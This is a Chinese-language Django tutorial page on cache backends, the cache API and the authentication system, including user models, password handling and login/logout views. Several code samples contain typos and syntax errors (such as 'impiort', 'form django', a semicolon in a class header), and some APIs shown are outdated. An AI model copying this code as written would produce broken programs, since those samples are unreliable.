TIMEOUT:缓存的默认过期时间,以秒为单位,默认300秒,None表示永远不会过期。设置成0将造成缓存立即失效此时缓存就没有意义了
OPTIONS:可选参数,根据缓存后端的不同而不同。
KEY_PREFIX:Django服务器使用的所有缓存键的字符串。
VERSION:由Django服务器生成的默认版本号。
KEY_FUNCTION:一个字符串,其中包含一个函数的点路径,该函数定义了如何将前缀,版本和密钥组合成最终缓存密钥。

</pre><textarea>
# 下面例子中配置了一个基于文件系统的缓存后端,缓存过期时间被设置为60秒,最大条目为1000
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {
            'MAX_ENTRIES': 1000
        }
    }
}

# 以下示例配置了一个基于python-memcached库的后端,其对象大小限制为2MB:
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',
        'LOCATION': '127.0.0.1:11211',
        'OPTIONS': {
            'server_max_value_length': 1024 * 1024 * 2,
        }
    }
}

# 以下是基于pylibmc库的后端配置,该后端启用二进制协议、SASL认证和ketama行为模式:
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.memcached.PyLibMCCache',
        'LOCATION': '127.0.0.1:11211',
        'OPTIONS': {
            'binary': True,
            'username': 'user',
            'password': 'pass',
            'behaviors': {
                'ketama': True,
            }
        }
    }
}

</textarea><pre>
【 缓存全站 】
缓存系统最简单的使用方法是缓存整个网站。
这需要额外将'django.middleware.cache.UpdateCacheMiddleware'和'django.middleware.cache.FetchFromCacheMiddleware'添加到MIDDLEWARE设置中,update中间件必须放在列表的开始位置,而fectch中间件必须放在最后。 这是Django使用中间件的规则,它们是有顺序关系的。

MIDDLEWARE = ['django.middleware.cache.UpdateCacheMiddleware','django.middleware.common.CommonMiddleware','django.middleware.cache.FetchFromCacheMiddleware',]

然后添加下面这些需要的参数到settings文件里:
CACHE_MIDDLEWARE_ALIAS : 用于存储的缓存的别名
CACHE_MIDDLEWARE_SECONDS : 每个page需要被缓存多少秒.
CACHE_MIDDLEWARE_KEY_PREFIX : 密钥前缀

【 缓存视图 】
另一个使用缓存框架的方法是对视图的输出进行缓存。在django.views.decorators.cache定义了一个自动缓存视图响应结果的装饰器cache_page

</pre><textarea>
from django.views.decorators.cache import cache_page

@cache_page(60 * 15)  # cache_page接受一个参数:timeout,秒为单位,my_view()视图的结果将被缓存15分钟
def my_view(request):
    ...

# 和站点缓存一样,视图缓存与URL无关,如果多个URL指向同一视图则每个URL将会分别缓存
# 发送到/foo/23/和/foo/1/的请求会被分别缓存,一旦一个明确的URL如/foo/23/已经被请求过了,之后再度发出的指向该URL的请求将使用缓存的内容。
urlpatterns = [
    url(r'^foo/([0-9]{1,2})/$', my_view),
]

# cache_page装his起也可以使用一些额外的参数比如cache,这个参数指示具体使用的缓存后端。
@cache_page(60 * 15, cache="special_cache")
def my_view(request):
    ...

# 还可以采用可选的关键字参数key_prefix在每个视图中指定具体的缓存前缀
@cache_page(60 * 15, key_prefix="site1")
def my_view(request):
    ...

</textarea><pre>
【 在URLconf中指定视图缓存 】
上一节的例子硬编码了视图被缓存的事实,因为cache_page改变了my_view函数。这种方法将视图和缓存系统耦合起来,这样并不理想。例如可能想在其他没有缓存的站点上重用这个视图函数,或可能想分发这个视图给那些想使用视图但不想缓存它们的人员。解决这些问题的办法是在URLconf中指定视图缓存,而不是视图函数旁边指定。

方法很简单：当在URLconf中引用它时用cache_page简单包装视图函数。这是之前的旧的URLconf ：
urlpatterns = [ path('foo/< int:code>/', my_view),]
将my_view包含在cache_page中：
from django.views.decorators.cache import cache_page
urlpatterns = [ path('foo/< int:code>/', cache_page(60 * 15)(my_view)),]

</pre><pre>
【 缓存模板片段 】
还可以使用cache模板标签来缓存模板的一个片段。要使用这个标签,首先要在模版的顶部位置添加{% load cache %}。
模板标签{% cache %}将在设定的时间内,缓存标签块中包含的内容。它最少需要两个参数:缓存时间(以秒为单位)及给缓存片段起的名称。像这样:

</pre><textarea>
{% load cache %}
{% cache 500 sidebar %}
    .. sidebar ..
{% endcache %}

# 还可以依据片段内的动态内容缓存多个版本。如上个例子中,可以给站点的每个用户生成不同版本的sidebar缓存。 只需要给{% cache %}标签再传递一个参数来标识区分这个缓存片段

{% load cache %}
{% cache 500 sidebar request.user.username %}
    .. sidebar for logged in user ..
{% endcache %}

# 缓存超时参数可以是个模板变量,只要模板变量可以解析为整数值即可。例如,如果模板变量my_timeout设置为值600,则以下两个示例是等效的:
{% cache 600 sidebar %} ... {% endcache %}
{% cache my_timeout sidebar %} ... {% endcache %}

</textarea><pre>
【 底层缓存API 】
有时缓存整个渲染页面并不会带来太多好处,事实上这样会很不方便。
或许站点包含了一个视图,它的结果依赖于许多费时的查询,而且结果会随着时间变化而改变。在这个情况下使用站点或视图缓存策略提供的全页面缓存并不理想,因为不能缓存所有结果(一些数据经常变动),不过仍然可以缓存几乎没有变化的结果。

像这样的情况,Django公开了一个简单的底层的缓存API,可以使用这个API以任意级别粒度在缓存中存储对象。可以缓存任何可以安全的pickle的Python对象：模型对象的字符串、字典、列表或其他,大部分通用的Python对象都可以被pickle

访问缓存
django.core.cache.caches
可以通过类似字典一样的object: django.core.cache.caches对象访问在CACHES配置的缓存。重复请求同一个线程里的同一个别名将返回同一个对象。

>>> from django.core.cache import caches
>>> cache1 = caches['myalias']
>>> cache2 = caches['myalias']
>>> cache1 is cache2 # rue

如果键名不存在,将会引发InvalidCacheBackendError错误。
为了支持线程安全,将为每个线程返回缓存后端的不同实例。

django.core.cache.cache
作为快捷方式,默认缓存可以通过django.core.cache.cache引用：

>>> from django.core.cache import cache
这个对象等价于 caches['default'] 。

基本用法
基本接口是：
cache.set(key, value, timeout=DEFAULT_TIMEOUT, version=None)
>>> cache.set('my_key', 'hello, world!', 30)

cache.get(key, default=None, version=None)
>>> cache.get('my_key') # 'hello, world!'

key是一个字符串,value可以任何picklable形式的Python对象。
timeout参数是可选的,默认CACHES中相应后端的timeout参数。它是值存在缓存里的秒数。timeout设置为None将永久缓存,为0将不缓存值。

如果对象不在缓存中cache.get()将返回None,建议不要在缓存中存储为None的值,因为不能分辨存储的None值还是因为缓存命中返回的None值。
>>> # Wait 30 seconds for 'my_key' to expire...
>>> cache.get('my_key') # None

cache.get()可以带一个默认参数。如果对象不在缓存中,将返回指定的值。
>>> cache.get('my_key', 'has expired') # 'has expired'

cache.add(key, value, timeout=DEFAULT_TIMEOUT, version=None)
键不存在时使用add()方法可以添加键,与set()带有相同的参数,但如果指定的键已经存在,将不会尝试更新缓存。
如果想知道通过add()存储的值是否在缓存中,可以检查返回值。如果值已保存将返回True,否则返回False
>>> cache.set('add_key', 'Initial value')
>>> cache.add('add_key', 'New value')
>>> cache.get('add_key') # 'Initial value'

cache.get_or_set(key, default, timeout=DEFAULT_TIMEOUT, version=None)
如果想得到键值或如果键不在缓存中时设置一个值,可以使用get_or_set()方法。它带有和get()一样的参数,但默认是为那个键设置一个新缓存值,而不是简单返回：
>>> cache.get('my_new_key')  # returns None
>>> cache.get_or_set('my_new_key', 'my new value', 100) # 'my new value'

也可以传递任何可调用的值作为默认值：
>>> import datetime
>>> cache.get_or_set('some-timestamp-key', datetime.datetime.now) # datetime.datetime(2014, 12, 11, 0, 15, 49, 457920)

cache.get_many(keys, version=None)
这里也有get_many()接口,返回一个字典,其中包含请求的键,这些键真实存在缓存中(并且没过期)：
>>> cache.set('a', 1)
>>> cache.set('b', 2)
>>> cache.set('c', 3)
>>> cache.get_many(['a', 'b', 'c']) # {'a': 1, 'b': 2, 'c': 3}

cache.set_many(dict, timeout)
使用set_many()传递键值对的字典,可以更有效的设置多个值。
>>> cache.set_many({'a': 1, 'b': 2, 'c': 3})
>>> cache.get_many(['a', 'b', 'c']) # {'a': 1, 'b': 2, 'c': 3}

类似cache.set(),set_many()带有一个可选的timeout参数,在已支持的后端(memcached),set_many()会返回无法插入的键列表。

cache.delete(key, version=None)
显示地删除键,这是清除特定对象缓存的简便方法：
>>> cache.delete('a')

cache.delete_many(keys, version=None)
一次性清除很多键时给delete_many()传递一个键列表即可删除。
>>> cache.delete_many(['a', 'b', 'c'])

cache.clear()
删除缓存里的所有键,不只是应用里设置的那些键。
>>> cache.clear()

cache.touch(key, timeout=DEFAULT_TIMEOUT, version=None)
为键设置一个新的过期时间,成功则返回True,否则False,和其他方法一样,timeout参数是可选的,并且默认是CACHES设置的相应后端的TIMEOUT选项;比如更新一个键为从现在起10秒钟后过期：
>>> cache.touch('a', 10) # True

cache.incr(key, delta=1, version=None)
cache.decr(key, delta=1, version=None)
递增或递减一个已经存在的键的值,默认递增或递减1。通过为递增/递减的调用提供参数来指定其他递增/递减值。如果试图递增或递减一个不存在的缓存键将会引发ValueError错误。
>>> cache.set('num', 1)
>>> cache.incr('num') # 2
>>> cache.incr('num', 10) # 12
>>> cache.decr('num') # 11
>>> cache.decr('num', 5) # 6

不保证incr()/decr()方法是原子。那些后端支持原子递增/递减(最值得注意的是memcached后端),递增和递减操作是原子的。然而如果后端本身没有提供递增/递减方法则将使用两步(检索和更新)来实现。

cache.close()
如果缓存后端已经实现了close()方法可以关闭和缓存的连接,对于没有实现close方法的缓存将无效操作
>>> cache.close()

</pre>
</div>

<div id="django_auth">
<h4>Authentication</h4><pre>
Django自带一个用户认证系统,用于处理用户账户、群组、许可和基于cookie的用户会话。
Django的认证系统包含了身份验证和权限管理两部分,身份验证用于核实某个用户是否合法,权限管理则是决定一个合法用户具有哪些权限

Django内置的认证权限系统主要包括下面几个部分:
用户(Users)
许可(Permissions)：用来定义一个用户(user)是否能够做某项任务(task)
组(Groups)：一种可以批量分配许可到多个用户的通用方式
可配置的密码哈希系统
用于用户登录或限制访问的表单和视图工具
可插拔的后台系统

类似下面的问题,不是Django认证系统的业务范围,请使用第三方工具:
密码强度检查
登录请求限制
第三方认证

默认情况下使用django-admin startproject命令后,认证相关的模块已经自动添加到settings文件内了,如果没有的话,请手动添加。

在INSTALLED_APPS配置项中添加:
'django.contrib.auth': 包含认证框架的核心以及默认模型
'django.contrib.contenttypes':内容类型系统,用于给模型关联许可,auth中的Permission模型依赖于contenttypes

在MIDDLEWARE配置项中添加:
SessionMiddleware:通过请求管理会话
AuthenticationMiddleware:将会话和用户关联

当配置正确后,运行manage.py migrate命令,创建用户认证系统相关的数据库表以及分配预定义的权限

auth_user
auth_group
auth_permission
auth_group_permissions
auth_user_groups
auth_user_user_permissions

>>> print([e for e in dir(django.contrib.auth.models) if not e.startswith('_')])
['AbstractBaseUser', 'AbstractUser', 'AnonymousUser', 'BaseUserManager', 'ContentType', 'EmptyManager', 'Group', 'GroupManager', 'Permission', 'PermissionDenied', 'PermissionManager', 'PermissionsMixin', 'UnicodeUsernameValidator', 'User', 'UserManager', 'auth', 'models', 'send_mail', 'timezone', 'update_last_login']

【 用户对象 】
用户对象是Django认证系统的核心,在Django的认证框架中只有一个用户模型也就是User模型,它位于django.contrib.auth.models模块中。
用户认证系统的所有功能都是基于这个User模型的,和这个User模型没有任何关系的自定义用户模型是无法使用Django认证系统的功能的

User模型对应于一个用户,一个帐户,用户模型主要有下面几个字段:username、password、email、first_name、last_name

sqlite> .schema auth_user
CREATE TABLE IF NOT EXISTS "auth_user" (
    "id" integer NOT NULL PRIMARY KEY AUTOINCREMENT,
    "username" varchar(150) NOT NULL UNIQUE,
    "first_name" varchar(30) NOT NULL,
    "last_name" varchar(150) NOT NULL
    "password" varchar(128) NOT NULL,
    "email" varchar(254) NOT NULL,
    "is_superuser" bool NOT NULL,
    "is_staff" bool NOT NULL,
    "is_active" bool NOT NULL,
    "last_login" datetime NULL,
    "date_joined" datetime NOT NULL,
);
sqlite> .schema auth_group
CREATE TABLE IF NOT EXISTS "auth_group" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(150) NOT NULL UNIQUE);
sqlite> .schema auth_permission
CREATE TABLE IF NOT EXISTS "auth_permission" (
    "id" integer NOT NULL PRIMARY KEY AUTOINCREMENT,
    "content_type_id" integer NOT NULL REFERENCES "django_content_type" ("id") DEFERRABLE INITIALLY DEFERRED,
    "codename" varchar(100) NOT NULL, "name" varchar(255) NOT NULL
);
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
sqlite> select * from auth_user;
id|password|last_login|is_superuser|username|first_name|email|is_staff|is_active|date_joined|last_name
1|pbkdf2_sha256$150000$JJ5nqspgZEL2$LBRIOeG3sQj5mT/bqrIwdH53OFLxf+IFW1xo250J3Cw=|2019-08-15 00:29:54.036253|1|admin|||1|1|2019-08-12 15:42:49.635297|

User对象有以下几个属性：
username:字符串类型。必填。30个字符以内。
first_name:字符串类型。可选。30个字符以内。
last_name:字符串类型。可选。30个字符以内。
email:可选。
password:明文密码的hash或是某种元数据。该属性不应该直接赋值明文密码,而应该通过set_password()方法进行赋值
is_staff:Boolean类型。用这个来判断是否用户可以登录进入admin site,即用户是否拥有网站的管理权限
is_active:Boolean类型。用来判断该用户是否是可用激活状态,即是否允许用户登录。删除一个帐户时可选择将这个属性置为False,而不是真正删除。这样如果应用有外键引用到这个用户,外键就不会被破坏。
is_superuser:Boolean类型。该属性用来表示该用户拥有所有的许可,而无需明确的赋予给他。
last_login:datetime类型。最近一次登陆时间。
date_joined：datetime类型。创建时间。

User对象有两个多对多的属性分别是：groups和user_permissions
$ python3 manage.py shell
>>> from django.contrib.auth.models import User
>>> User.objects.all()
< QuerySet [< User: admin>]>
>>> myuser = User.objects.get(pk=1)
>>> myuser
< User: admin>
>>> myuser.groups
< django.db.models.fields.related_descriptors.create_forward_many_to_many_manager.< locals>.ManyRelatedManager object at 0x7f4bd2042a90>
>>> myuser.user_permissions
< django.db.models.fields.related_descriptors.create_forward_many_to_many_manager.< locals>.ManyRelatedManager object at 0x7f4bd2078208>

myuser.groups = [group_list]             # 直接将一个列表赋值给该属性
myuser.groups.set([group_list])
myuser.groups.add(group, group, ...)     # 使用add方法将对象加入
myuser.groups.remove(group, group, ...)  # 使用remove方法将对象删除
myuser.groups.clear()                    # 使用clear方法将所有对象删除

myuser.user_permissions = [permission_list]
myuser.user_permissions.set([permission_list])
myuser.user_permissions.add(permission, permission, ...)
myuser.user_permissions.remove(permission, permission, ...)
myuser.user_permissions.clear()

除了DjangoModel对象的通用方法之外,User对象有以下特有方法：
is_anonymous():
永远返回False.用来将User对象和AnonymousUser(未登录的匿名用户)对象作区分用的识别方法。通常最好用is_authenticated()方法。

is_authenticated():
永远返回True。该方法不代表该用户有任何的许可,也不代表该用户是active的,而只是表明该用户提供了正确的username和password。

get_full_name():
返回一个字符串,是first_name和last_name中间加一个空格组成。

set_password(raw_password):
调用该方法时候传入一个明文密码,该方法会进行hash转换。该方法调用之后并不会保存User对象。

check_password(raw_password)：
如果传入的明文密码是正确的返回True。该方法和set_password是一对,也会考虑hash转换。

set_unusable_password()：
将用户设置为没有密码的状态。调用该方法后,check_password()方法将会永远返回false。但如果调用set_password()方法重新设置密码后该方法将会失效,has_usable_password()也会返回True。

has_usable_password()：
在调用set_unusable_password()方法之后该方法返回False,正常情况下返回True。

get_group_permissions(obj=None)：
返回该用户通过组所拥有的许可(字符串列表每一个代表一个许可)。如果指定obj将会返回关于该对象的许可,而不是模型。

get_all_permissions(obj=None):
返回该用户所拥有的所有的许可,包括通过组的和通过用户赋予的许可。

has_perm(perm, obj=None)：
如果用户有传入的perm则返回True。perm可以是一个格式为：'< app label>.< permission codename>'的字符串。如果User对象为inactive该方法永远返回False。和前面一样,如果传入obj则判断该用户对于这个对象是否有这个许可。

has_perms(perm_list,obj=None):
和has_perm一样,不同的地方是第一个参数是一个perm列表,只有用户拥有传入的每一个perm,返回值才是True。

has_module_perms(app_name)：
传入的是Django app label,按照'< app label>.< permission codename>'格式。当用户拥有该app label下面所有的perm时返回值为True。如果用户为inactive返回值永远为False。

email_user(subject,message,from_email=None)：
发送一封邮件给这个用户,依靠的当然是该用户的email属性。如果from_email不提供的话,Django会使用settings中的DEFAULT_FROM_EMAIL发送。

get_profile()：
返回一个和Site相关的profile对象,用来存储额外的用户信息

【 匿名用户AnonymousUser 】
django.contrib.auth.models.AnonymousUser是实现了User接口的类。用户还没有用权限系统登陆时在request.user中使用的就是该对象,用户可以通过调用is_anonymous()方法来验证是否为匿名用户。以下是该对象和User对象的差异：

id永远是None
is_staff和is_superuser永远为False
groups和user_permissions永远为空
is_anoymous()为True
is_authenticated()为False
set_password(),check_password(),save(),delete(),set_groups()和set_permissions()抛出NotImplementedError.

【 User对象的Manager,UserManager 】
和其他的模型一样,User模型类的objects属性也是一个Manager对象,但是User的Manager对象是自定义的,增加了一些方法：

create_user(self, username, email=None, password=None, **extra_fields)
该方法创建保存一个is_active=True的User对象并返回。username不能够为空,否则抛出ValueError异常。email和password都是可选的。email的domain部分会被自动转变为小写。password如果没有提供则User对象的set_unusable_password()方法将会被调用。

create_superuser(self, username, email, password, **extra_fields)

1. 创建用户
要创建一个新用户,最直接的办法是使用create_user()方法:如果已经启用了Django的admin站点,也可以在后台创建用户
>>> from django.contrib.auth.models import User
>>> user = User.objects.create_user('berlin', '465***869@qq.com', 'berlinpw')
>>> User.objects.all()
< QuerySet [< User: admin>, < User: berlin>]>
>>> user.is_staff
False
# 这时user是一个User类的实例,已经保存在了数据库内,可以随时修改它的属性,然后调用save()更新入库
>>> user.is_staff = True
>>> user.save()

等效于
user = User()
user.username = 'berlin'
user.email = '465***869@qq.com'
user.set_password('berlinpw')
user.save()

2. 创建超级用户
使用createsuperuser命令,创建超级用户:
$ python manage.py createsuperuser
$ python manage.py createsuperuser --username=joe --email=joe@example.com

3. 修改密码
Django默认会对密码进行加密,因此不要企图对密码进行直接操作,要修改密码有两个办法:
使用命令行: python manage.py changepassword username,如果不提供用户名则会尝试修改当前系统用户的密码。
使用set_password()方法:
from django.contrib.auth.models import User
u = User.objects.get(username='john')
u.set_password('new password')
u.save()
同样可以在admin中修改密码。Django提供了views和forms,方便用户自己修改密码,修改密码后用户的所有当前会话将被注销。

</pre><textarea>
@login_required
def set_password(request):
    user = request.user
​    err_msg = ''
    if request.method == 'POST':
        old_password = request.POST.get('old_password', '')
        new_password = request.POST.get('new_password', '')
        repeat_password = request.POST.get('repeat_password', '')
        # 检查旧密码是否正确
        if user.check_password(old_password):
            if not new_password:err_msg = '新密码不能为空'
            elif new_password != repeat_password:err_msg = '两次密码不一致'
            else:user.set_password(new_password)user.save()
            return redirect("/login/")
        else:
            err_msg = '原密码输入错误'
            content = {'err_msg': err_msg,}
            return render(request, 'set_password.html', content)

</textarea><pre>
4. 用户验证
利用authenticate()方法对用户进行验证,该方法通常接收username与password作为参数。认证的后端可能有好几个,有一项认证通过则返回一个User类对象,一项都没通过或抛出了PermissionDenied异常则返回一个None

from django.contrib.auth import authenticate
user = authenticate(username='john', password='secret')
if user is not None:
    # A backend authenticated the credentials
else:
    # No backend authenticated the credentials

【 自定义用户模型的两种方法 】
一、通过新建自定义模型一对一关联User模型来拓展,如使用UserProfile存储用户的额外信息

</pre><textarea>
# myapp/models.py
from django.db impiort models
from django.contrib.auth.models import User

class UserProfile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)  # 和User的一对一关系

    # 其他需要存储的字段
    nickname = models.CharField(max_length=20, verbose_name=_('昵称'))
    accepted_eula = models.BooleanField()
    favorite_animal = models.CharField(max_length=20, default="Dragons.")

    def __str__(self):
        return '< UserProfile: %s for %s >' % (self.nickname, self.user.useranme)

# myapp/admin.py
from django.contrib import admin
form django.contrib.auth.admin import UserAdmin as BaseUserAdmin
form django.contrib.auth.models import User
from .models import UserProfile

@admin.register(UserProfile)
class UserProfileAdmin(admin.ModelAdmin):
    list_display = ('user', 'nickname', 'accepted_eula', 'favorite_animal')

# 修改admin的user模型显示
class UserProfileInline(admin.StackedInline):
    model = UserProfile
    can_delete = False

class UserAdmin(BaseUserAdmin);
    inlines = (UserProfileInline,)
    list_display = ('username', 'nickname', 'email', 'is_staff', 'is_active', 'is_superuser')

    def nickname(self, obj):
        return obj.profile.nickname

    nickname.short_description = '昵称'

admin.site.unregister(User)
admin.site.register(User, UserAdmin)

</textarea><pre>
在Django中有一种机制可以存储和User在某个Site相关的一些信息到一个对象中,这个对象就是UserProfile。

2.接下来要在settings中声明一个变量,变量名为AUTH_PROFILE_MODULE,值为appname.profile类名,如下：
AUTH_PROFILE_MODULE = 'accounts.UserProfile'
这样User对象的get_profile()方法就会返回这个对象了。UserProfile对象不会和User一起自动创建,需要以某种方式自己搞定这件事情,最合理的方式就是注册一个handler到User的post_save signal：

</pre><textarea>
# models.py
from django.contrib.auth.models import User
from django.db.models.signals import post_save

# 定义了UserProfile
# ...

def create_user_profile(sender, instance, created, **kwargs):
    if created:
        UserProfile.objects.create(user=instance)

post_save.connect(create_user_profile, sender=User)

</textarea><pre>
二、通过继承AbstractUser扩展默认的auth_user表
可以通过继承内置的AbstractUser类来定义一个自己的Model类。这样既能根据项目需求灵活的设计用户表,又能使用Django强大的认证系统了

</pre><textarea>
from django.contrib.auth.models import AbstractUser
class UserInfo(AbstractUser):
    """用户信息表"""
    nid = models.AutoField(primary_key=True)
    phone = models.CharField(max_length=11, null=True, unique=True)

    def __str__(self):
        return self.username

    class Meta(AbstractUser.Meta):
        pass

</textarea><pre>
按上面的方式扩展了内置的auth_user表之后,一定要在settings.py中告诉Django现在使用新定义的UserInfo表来做用户认证：
# 引用Django自带的User表,继承使用时需要设置
AUTH_USER_MODEL = "myapp.UserInfo"

一旦指定了新的认证系统所使用的表就需要删除原先的迁移文件和数据库,重新在数据库中创建该表,而不能继续使用原来默认的auth_user表
$ python3 manage.py makemigrations
$ python3 manage.py migrate
$ python3 manage.py createcachetable
$ python3 manage.py createsuperuser

获取认证model类的两种方式,可互换
1、通过django.contrib.auth.get_user_model()获取到当前auth组件使用的认证model类
form django.contrib.auth import get_user_model
User = get_user_model()

2、如果要在其它model类关联使用的认证model类,最好通过django.conf.settings.AUTH_USER_MODEL获取。这是最佳实践,关联认证model类。因为如果直接引用,万一改变了model认证类的化,还要来改变这里的代码。
from django.conf import settings
author = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)

</pre>admin添加user模型<textarea>
# myapp/admin.py
from django.contrib import admin
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from django.contrib.auth import get_user_model
from django.utils.translation import gettext_lazy as _

User = get_user_model()

@admin.register(User)
class UserAdmin(BaseUserAdmin):
    fieldsets = (
        (None, {'fields': ('username', 'password')}),
        (_('Personal info'), {'fields': ('phone', 'email')}),
        (_('Permissions'), {'fields': ('is_active', 'is_staff', 'is_superuser', 'groups', 'user_permissions')}),
        (_('Important dates'), {'fields': ('last_login', 'date_joined')}),
    )

    list_display = ('username', 'email', 'phone', 'is_staff', 'is_active', 'is_superuser')

</textarea><pre>

</pre>

<h4>django(权限、认证)系统——用户Login,Logout</h4><pre>
在Web应用中任何的权限系统要做的第一步就是用户识别即登陆(login)。只有正确的登陆校验,知道用户是谁了,才能够知道用户能干什么,那就是许可(Permission)需要负责解决的事情,而Group则是批量设置许可的时候的一个便利手段

【 Web请求的认证 】
django有一套方法可以在每个view方法能够接收到的request对象中增加权限验证相关的方法,首先需要安装SessionMiddleware和AuthenticationMiddleware

一旦安装好了之后,在view中可以使用request.user获取当前的登陆用户User对象。如果当前用户没有登陆,那么request.user将会是AnonymousUser对象,可以用User对象的is_authenticated()方法将这两者区分开来：

</pre><textarea>
if request.user.is_authenticated():
    # 做一些事情针对验证用户.
else:
    # 做一些事情对于匿名未登录用户.

</textarea><pre>
【 在视图中认证用户 】
Django使用session和中间件关联请求对象中和认证系统。
每一次请求中都包含一个request.user属性表示当前用户,如果该用户未登陆该属性的值是一个AnonymousUser实例(匿名用户),如果已经登录该属性就是一个User模型的实例。

可以使用is_authenticated方法进行判断
if request.user.is_authenticated: # Do something for authenticated users.
else: # Do something for anonymous users.

auth.authenticate() 与 request.user.is_authenticated 的使用场景和功能区别：
两者看上去都是认证有关系,但两种使用场景和目的是不同的。
前者是认证,其返回的结果是User_obj或None,目的是判定认证是否成功,仅仅使用在登录认证view视图函数中。
后者是是否有用户登录,其返回结果是True或False。目的是校验用户是否登录了,用于除了登录认证view与不校验用户登录的view。即需要校验用户登录状况才有后续操作的情景中。这个的前提是auth.authenticate和auth.login两个登录过程操作。只有两者操作了才有登录的判定。

</pre><textarea>
# 认证和登陆:视图中使用认证系统的login()方法登录用户,它接收一个HttpRequest参数和一个User对象参数,该方法把用户的ID保存在Django的session中
from django.contrib.auth import authenticate, login

def my_view(request):
    username = request.POST['username']
    password = request.POST['password']
    user = authenticate(username=username, password=password)
    if user is not None:
        login(request, user)
        # 跳转到成功页面
    else:
        # 返回一个非法登录的错误页面

# 注销用户:logout(request),被logout的用户如果没登录不会抛出错误,一旦logout当前请求中的session数据都会被清空。
from django.contrib.auth import logout
def logout_view(request):
    logout(request)
    # Redirect to a success page.

</textarea><pre>
【 用户登陆 】
需要两个函数：authenticate(username,password)和login(request,user)结合使用,位于django.contrib.auth模块中

1.authenticate(username,password)
如果校验通过则返回User对象,否则返回None

</pre><textarea>
from django.contrib.auth import authenticate
user = authenticate(username='john', password='secret')
if user is not None:
    if user.is_active:
        print "You provided a correct username and password!"
    else:
        print "Your account has been disabled!"
else:
    print "Your username and password were incorrect."

</textarea><pre>
2.login接受两个参数,第一个是request对象,第二个是user对象。login方法使用SessionMiddleware将userID存入session当中。
在用户还未登录时也存在着匿名用户的Session,在其登陆之后之前在匿名Session中保留的信息都会保留下来。这两个方法要结合使用,而且必须要先调用authenticate(),因为该方法会User的一个属性上纪录该用户已经通过校验了,这个属性会被随后的login过程所使用,例如：

</pre><textarea>
from django.contrib.auth import authenticate, login

def my_view(request):
    username = request.POST['username']
    password = request.POST['password']
    user = authenticate(username=username, password=password)
    if user is not None:
        if user.is_active:
            login(request, user)
            # 跳转到成功页面.
        else:
            # 返回一个无效帐户的错误
    else:
        # 返回登录失败页面。

</textarea><pre>
也可以不用authenticate()进行特定于一个用户的身份校验,直接使用和User无关的几个函数进行密码相关的校验,这些方法位于模块django.contrib.auth.hashers

print([e for e in dir(django.contrib.auth.hashers) if not e.startswith("_")])
['Argon2PasswordHasher', 'BCryptPasswordHasher', 'BCryptSHA256PasswordHasher', 'BasePasswordHasher', 'CryptPasswordHasher', 'ImproperlyConfigured', 'MD5PasswordHasher', 'OrderedDict', 'PBKDF2PasswordHasher', 'PBKDF2SHA1PasswordHasher', 'SHA1PasswordHasher', 'UNUSABLE_PASSWORD_PREFIX', 'UNUSABLE_PASSWORD_SUFFIX_LENGTH', 'UnsaltedMD5PasswordHasher', 'UnsaltedSHA1PasswordHasher', 'base64', 'binascii', 'check_password', 'constant_time_compare', 'functools', 'get_hasher', 'get_hashers', 'get_hashers_by_algorithm', 'get_random_string', 'hashlib', 'identify_hasher', 'import_string', 'importlib', 'is_password_usable', 'make_password', 'mask_hash', 'pbkdf2', 'receiver', 'reset_hashers', 'setting_changed', 'settings', 'warnings']

check_password(password, encoded)
第一个参数是明文密码,第二个参数是加密过的密码。如果通过校验返回True,不通过返回False

make_password(password[, salt, hashers])
根据给定的明文密码、salt和Django支持的加密算法返回一个加密的密码。如果password提供的值为None,那么该返回值将永远通不过check_password(),这个返回值是一个特定的约定值,目前是'!'

is_password_usable(encoded_password)
判断是否给定字符串是一个hashed密码,有机会通过check_password()函数的校验

</pre><textarea>
# 登录验证页面
def login(request):
    if request.method == 'POST':
        response = {
            'user': None,
            'msg': None,
        }
        login_name = request.POST.get('username')  # 因为使用的是ajax提交表单数据,对于表单数据的校验就放到前端吧.
        pwd = request.POST.get('password')
        valid_code = request.POST.get('valid_code')
        if valid_code.upper() == request.session['valid_code'].upper():  # 只做验证码校验和用户认证校验。
            user = auth.authenticate(username=login_name, password=pwd)
            if user:
                auth.login(request, user)  # 这样request.user 就会有当前登录对象
                response['user'] = user.username
                return JsonResponse(response)
            else:
                response['msg'] = '用户名或密码错误！'
                return JsonResponse(response)
        else:
            response['msg'] = '验证码错误！'
            return JsonResponse(response)
    return render(request, 'myblog/login.html')

</textarea><pre>
【 用户登出(log out) 】
使用django.contrib.auth.logout函数来登出用django.contrib.auth.login函数登入的用户。

logout(requet)
函数只有一个参数request,没有返回值,而且即使当前用户没有登陆也不会抛出任何异常。

</pre><textarea>
from django.contrib.auth import logout

def logout_view(request):
    logout(request)
    # 重定向到成功登出界面

</textarea><pre>
这个方法会将存储在用户session的数据全部清空,这样避免有人用当前用户的浏览器登陆然后就可以查看当前用户的数据了,login会保留anonymous用户的session数据。如果需要将一些东西加入到登出之后的用户session,那么需要在logout方法调用之后再进行。

【 认证视图 】
Django提供了一系列认证相关的视图,可以直接拿来用,这样就不需要自己写登录、注销、注册等视图。但Django没有为认证视图提供默认的模板,需要自己写
所以除非懒癌发作,还是老老实实自己写认证相关的视图、路由和模板吧。个人认为类似跟实际生产环境结合非常紧密的视图,根本不需要这种鸡肋的内置视图,到最后发现还是要自己写才能满足需求。

>>> from django.contrib.auth import views
>>> print([e for e in dir(views) if not e.startswith('_')])
